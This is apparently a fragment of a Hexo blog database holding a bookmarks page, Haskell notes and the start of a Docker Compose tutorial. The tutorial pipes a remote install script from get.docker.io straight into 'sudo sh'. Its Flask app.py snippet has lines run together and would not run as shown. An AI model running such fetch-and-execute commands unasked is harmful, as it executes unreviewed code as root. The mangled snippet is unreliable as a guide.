[Nodejs学习日志（一）——cheerio爬虫](http://molunerfinn.com/nodejs-1/)\n* [如何打造一个令人愉悦的前端开发环境（一）](https://segmentfault.com/a/1190000006157372)\n* [如何让你的网页打开速度降低到1s内](http://www.jianshu.com/p/d857c3ff78d6)","path":"fav.html","comments":1,"layout":"page","_id":"ciubisk8y00033sonbxg2h58d","content":"<p>这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。</p>\n<h1 id=\"网站\"><a href=\"#网站\" class=\"headerlink\" title=\"网站\"></a>网站</h1><ul>\n<li><a href=\"https://www.awesomes.cn/\" target=\"_blank\" rel=\"external\">Github热度排名</a></li>\n<li><a href=\"http://imweb.io/\" target=\"_blank\" rel=\"external\">imweb前端社区</a></li>\n<li><a href=\"http://www.zhangxinxu.com/wordpress/\" target=\"_blank\" rel=\"external\">鑫空间</a></li>\n<li><a href=\"http://www.alloyteam.com/\" target=\"_blank\" rel=\"external\">AlloyTeam</a></li>\n</ul>\n<h1 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h1><ul>\n<li><a href=\"http://mozilla.github.io/pdf.js\" target=\"_blank\" rel=\"external\">PDF.JS 加载pdf</a></li>\n</ul>\n<h1 id=\"娱乐\"><a href=\"#娱乐\" class=\"headerlink\" title=\"娱乐\"></a>娱乐</h1><ul>\n<li><a href=\"https://segmentfault.com/a/1190000005987011\" target=\"_blank\" rel=\"external\">前端 JSer 装逼手册</a></li>\n</ul>\n<h1 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h1><ul>\n<li><a href=\"https://github.com/jaywcjlove/awesome-mac\" target=\"_blank\" rel=\"external\">工具武装的前端开发工程师</a></li>\n<li><a href=\"http://imweb.io/topic/579deaee93d9938132cc8d88\" target=\"_blank\" rel=\"external\">Vim 初探</a></li>\n<li><a href=\"https://github.com/xitu/gold-miner/blob/master/TODO/using-zopfli-to-optimize-png-images.md\" target=\"_blank\" rel=\"external\">[译] 使用 Zopfli 优化 PNG 图片</a></li>\n<li><a href=\"http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&amp;mid=2652201857&amp;idx=1&amp;sn=803e04a8304c127aaa0bb7770f8add1d&amp;scene=0#wechat_redirect\" target=\"_blank\" rel=\"external\">在Mac平台配置你的开发环境</a></li>\n<li><a href=\"https://github.com/Pearyman/chrome_plugin\" target=\"_blank\" rel=\"external\">前端工具箱chrome插件</a></li>\n</ul>\n<h1 id=\"模板素材\"><a href=\"#模板素材\" class=\"headerlink\" title=\"模板素材\"></a>模板素材</h1><ul>\n<li><a href=\"http://www.easyicon.net/\" target=\"_blank\" rel=\"external\">easyicon</a></li>\n<li><a href=\"https://xituqu.com/\" target=\"_blank\" rel=\"external\">稀土区</a></li>\n<li><a href=\"http://www.uisdc.com/\" target=\"_blank\" rel=\"external\">优设</a></li>\n<li><a href=\"https://marketplace.500px.com/\" target=\"_blank\" rel=\"external\">500px</a></li>\n<li><a href=\"https://alpha.wallhaven.cc/\" target=\"_blank\" rel=\"external\">壁纸wallhaven</a></li>\n<li><a href=\"http://www.htmleaf.com/\" target=\"_blank\" rel=\"external\">jquery</a></li>\n</ul>\n<h1 id=\"模板\"><a href=\"#模板\" class=\"headerlink\" title=\"模板\"></a>模板</h1><ul>\n<li><a href=\"https://html5up.net/\" target=\"_blank\" rel=\"external\">HTML5 UP</a></li>\n<li><a href=\"https://www.awesomes.cn/subject/admins\" target=\"_blank\" rel=\"external\">控制面板</a></li>\n</ul>\n<h1 id=\"文档\"><a href=\"#文档\" class=\"headerlink\" title=\"文档\"></a>文档</h1><ul>\n<li><a href=\"https://hexo.io/zh-cn/docs/\" target=\"_blank\" rel=\"external\">Hexo</a></li>\n</ul>\n<h1 id=\"文章\"><a href=\"#文章\" class=\"headerlink\" title=\"文章\"></a>文章</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21650547\" target=\"_blank\" rel=\"external\">通过一张简单的图，让你彻底地、永久地搞懂JS的\\=\\=运算</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21490434\" target=\"_blank\" rel=\"external\">如何在前端开发中增加编码效率，这里有十款 Chrome 扩展可以帮你</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000005947094\" target=\"_blank\" rel=\"external\">前端面试大全</a></li>\n<li><a href=\"http://tech.jandou.com/cross-domain.html\" target=\"_blank\" rel=\"external\">前端跨域及其解决方案</a></li>\n<li><a href=\"http://www.w3ctrain.com/2016/06/26/learn-git-in-30-minutes/\" target=\"_blank\" rel=\"external\">30分钟git命令入门到放弃</a></li>\n<li><a href=\"http://imweb.io/topic/55e32fd5771670e207a16bb9\" target=\"_blank\" rel=\"external\">(Canvas) 前端如何呼风唤雨</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21779628?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io\" target=\"_blank\" rel=\"external\">如何构建一支专业的前端开发团队（一）\n</a></li>\n<li><a href=\"http://molunerfinn.com/nodejs-1/\" target=\"_blank\" rel=\"external\">Nodejs学习日志（一）——cheerio爬虫</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000006157372\" target=\"_blank\" rel=\"external\">如何打造一个令人愉悦的前端开发环境（一）</a></li>\n<li><a href=\"http://www.jianshu.com/p/d857c3ff78d6\" target=\"_blank\" rel=\"external\">如何让你的网页打开速度降低到1s内</a></li>\n</ul>\n","excerpt":"","more":"<p>这是一个真正的前端收藏夹，由于前端技术更新较快，好资源太多，在这里做个收藏夹，只为方便自己。</p>\n<h1 id=\"网站\"><a href=\"#网站\" class=\"headerlink\" title=\"网站\"></a>网站</h1><ul>\n<li><a href=\"https://www.awesomes.cn/\">Github热度排名</a></li>\n<li><a href=\"http://imweb.io/\">imweb前端社区</a></li>\n<li><a href=\"http://www.zhangxinxu.com/wordpress/\">鑫空间</a></li>\n<li><a href=\"http://www.alloyteam.com/\">AlloyTeam</a></li>\n</ul>\n<h1 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h1><ul>\n<li><a href=\"http://mozilla.github.io/pdf.js\">PDF.JS 加载pdf</a></li>\n</ul>\n<h1 id=\"娱乐\"><a href=\"#娱乐\" class=\"headerlink\" title=\"娱乐\"></a>娱乐</h1><ul>\n<li><a href=\"https://segmentfault.com/a/1190000005987011\">前端 JSer 装逼手册</a></li>\n</ul>\n<h1 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h1><ul>\n<li><a href=\"https://github.com/jaywcjlove/awesome-mac\">工具武装的前端开发工程师</a></li>\n<li><a href=\"http://imweb.io/topic/579deaee93d9938132cc8d88\">Vim 初探</a></li>\n<li><a href=\"https://github.com/xitu/gold-miner/blob/master/TODO/using-zopfli-to-optimize-png-images.md\">[译] 使用 Zopfli 优化 PNG 图片</a></li>\n<li><a href=\"http://mp.weixin.qq.com/s?__biz=MzI3MDE0MzAzMw==&amp;mid=2652201857&amp;idx=1&amp;sn=803e04a8304c127aaa0bb7770f8add1d&amp;scene=0#wechat_redirect\">在Mac平台配置你的开发环境</a></li>\n<li><a href=\"https://github.com/Pearyman/chrome_plugin\">前端工具箱chrome插件</a></li>\n</ul>\n<h1 id=\"模板素材\"><a href=\"#模板素材\" class=\"headerlink\" title=\"模板素材\"></a>模板素材</h1><ul>\n<li><a href=\"http://www.easyicon.net/\">easyicon</a></li>\n<li><a href=\"https://xituqu.com/\">稀土区</a></li>\n<li><a href=\"http://www.uisdc.com/\">优设</a></li>\n<li><a href=\"https://marketplace.500px.com/\">500px</a></li>\n<li><a href=\"https://alpha.wallhaven.cc/\">壁纸wallhaven</a></li>\n<li><a href=\"http://www.htmleaf.com/\">jquery</a></li>\n</ul>\n<h1 id=\"模板\"><a href=\"#模板\" class=\"headerlink\" title=\"模板\"></a>模板</h1><ul>\n<li><a href=\"https://html5up.net/\">HTML5 UP</a></li>\n<li><a href=\"https://www.awesomes.cn/subject/admins\">控制面板</a></li>\n</ul>\n<h1 id=\"文档\"><a href=\"#文档\" class=\"headerlink\" title=\"文档\"></a>文档</h1><ul>\n<li><a href=\"https://hexo.io/zh-cn/docs/\">Hexo</a></li>\n</ul>\n<h1 id=\"文章\"><a href=\"#文章\" class=\"headerlink\" title=\"文章\"></a>文章</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21650547\">通过一张简单的图，让你彻底地、永久地搞懂JS的\\=\\=运算</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21490434\">如何在前端开发中增加编码效率，这里有十款 Chrome 扩展可以帮你</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000005947094\">前端面试大全</a></li>\n<li><a href=\"http://tech.jandou.com/cross-domain.html\">前端跨域及其解决方案</a></li>\n<li><a href=\"http://www.w3ctrain.com/2016/06/26/learn-git-in-30-minutes/\">30分钟git命令入门到放弃</a></li>\n<li><a href=\"http://imweb.io/topic/55e32fd5771670e207a16bb9\">(Canvas) 前端如何呼风唤雨</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/21779628?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io\">如何构建一支专业的前端开发团队（一）\n</a></li>\n<li><a href=\"http://molunerfinn.com/nodejs-1/\">Nodejs学习日志（一）——cheerio爬虫</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000006157372\">如何打造一个令人愉悦的前端开发环境（一）</a></li>\n<li><a href=\"http://www.jianshu.com/p/d857c3ff78d6\">如何让你的网页打开速度降低到1s内</a></li>\n</ul>\n"},{"layout":"tags","noDate":true,"comments":0,"_content":"","source":"tags/index.md","raw":"---\nlayout: tags\nnoDate: true\ncomments: false\n---\n","date":"2016-10-09T14:16:37.000Z","updated":"2016-09-12T09:04:04.000Z","path":"tags/index.html","title":"","_id":"ciubisk9200053sonq0b0zkaa","content":"","excerpt":"","more":""}],"Post":[{"title":"Haskell 手记（一）","id":"18","updated":"2016-09-01T00:14:45.000Z","_content":"\n#安装\nhttps://www.haskell.org/\n不多说。\n#运行\n>ghci\n\n#代码笔记\n##拼接列表\n>‘A’ :\" SMALL CAT\"\n\n>5:[1,2,3]\n\n>[1,2,3] ++ [5]\n\n\n\n\n","source":"_drafts/Haskell-手记（一）.md","raw":"---\ntitle: Haskell 手记（一）\npermalink: haskell-shou-ji-yi\nid: 18\nupdated: '2016-09-01 01:14:45'\ntags:\n---\n\n#安装\nhttps://www.haskell.org/\n不多说。\n#运行\n>ghci\n\n#代码笔记\n##拼接列表\n>‘A’ :\" SMALL CAT\"\n\n>5:[1,2,3]\n\n>[1,2,3] ++ [5]\n\n\n\n\n","slug":"haskell-shou-ji-yi","published":0,"date":"2016-09-11T14:41:20.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubisk8o00003sonfx2wr7iu","content":"<p>#安装<br><a href=\"https://www.haskell.org/\" target=\"_blank\" rel=\"external\">https://www.haskell.org/</a><br>不多说。</p>\n<p>#运行</p>\n<blockquote>\n<p>ghci</p>\n</blockquote>\n<p>#代码笔记</p>\n<p>##拼接列表</p>\n<blockquote>\n<p>‘A’ :” SMALL CAT”</p>\n<p>5:[1,2,3]</p>\n<p>[1,2,3] ++ [5]</p>\n</blockquote>\n","excerpt":"","more":"<p>#安装<br><a href=\"https://www.haskell.org/\">https://www.haskell.org/</a><br>不多说。</p>\n<p>#运行</p>\n<blockquote>\n<p>ghci</p>\n</blockquote>\n<p>#代码笔记</p>\n<p>##拼接列表</p>\n<blockquote>\n<p>‘A’ :” SMALL CAT”</p>\n<p>5:[1,2,3]</p>\n<p>[1,2,3] ++ [5]</p>\n</blockquote>\n"},{"title":"Docker Compose—简化复杂应用的利器 ","date":"2016-10-15T18:10:35.000Z","_content":"<div class=\"entry-content\">\n\t\t\t\t\t\t\t\t\t\t\t\t<p>Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。<span id=\"more-1319\"></span></p>\n<h2>1. 安装Docker和Compose</h2>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c25730712728\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\"># 当前最新的Docker是1.6.2，Compose为1.2.0\ncurl -s https://get.docker.io/ubuntu/ | sudo sh\nsudo apt-get update\nsudo apt-get install lxc-docker\n# 参考http://docs.docker.com/compose/install/#install-compose\ncurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\napt-get install python-pip python-dev\npip install -U docker-compose</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c25730712728-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c25730712728-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c25730712728-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c25730712728-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c25730712728-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c25730712728-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c25730712728-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c25730712728-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c25730712728-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c25730712728-10\">10</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-1\"><span class=\"crayon-p\"># 当前最新的Docker是1.6.2，Compose为1.2.0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-2\"><span class=\"crayon-v\">curl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//get.docker.io/ubuntu/ | sudo sh</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-3\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">update</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-4\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">lxc</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">docker</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-5\"><span class=\"crayon-p\"># 参考http://docs.docker.com/compose/install/#install-compose</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-6\"><span class=\"crayon-v\">curl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">L</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-7\"><span class=\"crayon-v\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-8\"><span class=\"crayon-p\">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c25730712728-9\"><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dev</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c25730712728-10\"><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">U</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0020 seconds] -->\n<p></p>\n<p>这样compose就安装好了，查看一下compose的版本信息：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c44835397497\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">chmod +x /usr/local/bin/docker-compose\ndocker-compose -version\ndocker-compose 1.2.0</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c44835397497-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c44835397497-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c44835397497-3\">3</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c44835397497-1\"><span class=\"crayon-r\">chmod</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">compose</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c44835397497-2\"><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">compose</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">version</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c44835397497-3\"><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">compose</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.2.0</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0011 seconds] -->\n<p></p>\n<h2>2. 使用Compose</h2>\n<p>使用Compose只需要简单的三个步骤：<br>\n首先，使用Dockerfile来定义你的应用环境：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c48878639680\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">FROM python:2.7\nADD ./code\nWORKDIR /code\nRUN pip install -r requirements.txt</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c48878639680-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c48878639680-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c48878639680-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c48878639680-4\">4</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c48878639680-1\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c48878639680-2\"><span class=\"crayon-i\">ADD</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c48878639680-3\"><span class=\"crayon-v\">WORKDIR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c48878639680-4\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">requirements</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0008 seconds] -->\n<p></p>\n<p>其中，requirements.txt中的内容包括：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c4d809478886\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">flask\nredis</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c4d809478886-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c4d809478886-2\">2</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c4d809478886-1\"><span class=\"crayon-e\">flask</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c4d809478886-2\"><span class=\"crayon-v\">redis</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0003 seconds] -->\n<p></p>\n<p>再用Python写一个简单的app.py</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c51291884198\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">from flask importFlaskfrom redis importRedisimport os\napp =Flask(__name__)\nredis =Redis(host='redis', port=6379)@app.route('/')def hello():\n    redis.incr('hits')return'Hello World! I have been seen %s times.'% redis.get('hits')if __name__ ==\"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True)</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c51291884198-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c51291884198-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c51291884198-5\">5</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-1\"><span class=\"crayon-st\">from</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">flask </span><span class=\"crayon-e\">importFlaskfrom </span><span class=\"crayon-e\">redis </span><span class=\"crayon-e\">importRedisimport </span><span class=\"crayon-k \">os</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c51291884198-2\"><span class=\"crayon-v\">app</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">Flask</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">__name__</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c51291884198-3\"><span class=\"crayon-v\">redis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">Redis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'redis'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">port</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">route</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'/'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-r\">def</span><span 